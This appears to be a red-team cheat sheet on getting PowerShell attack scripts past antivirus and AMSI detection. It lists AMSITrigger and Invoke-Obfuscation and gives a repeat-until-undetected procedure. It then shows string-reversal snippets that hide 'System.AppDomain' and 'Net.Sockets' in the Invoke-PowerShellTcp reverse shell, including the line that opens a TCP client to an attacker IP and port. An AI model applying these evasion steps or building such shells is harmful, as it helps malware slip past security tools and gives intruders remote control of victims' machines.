# AMSITrigger

https://github.com/RythmStick/AMSITrigger

AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detecetd.ps1

# For full obfuscation of PowerShell scripts:

https://github.com/danielbohannon/Invoke-Obfuscation

# Bypass AV Signatures Steps

1. Scan using AMSITrigger
2. Modify the deteceted code snippet
3. Rescan using AMSITrigger
4. Repeat 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

  * Reverse the "System.AppDomain" string
  
  $String = 'niamoDppA.metsyS'
  $classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
  $AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
  
  * Reverse the "Net.Sockets" string
  $String = "stekcoS.teN"
  $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
  if ($Reverse)
  {
    $client = New-Object System.$class.TCPClient($IPAddress,$Port)
  }
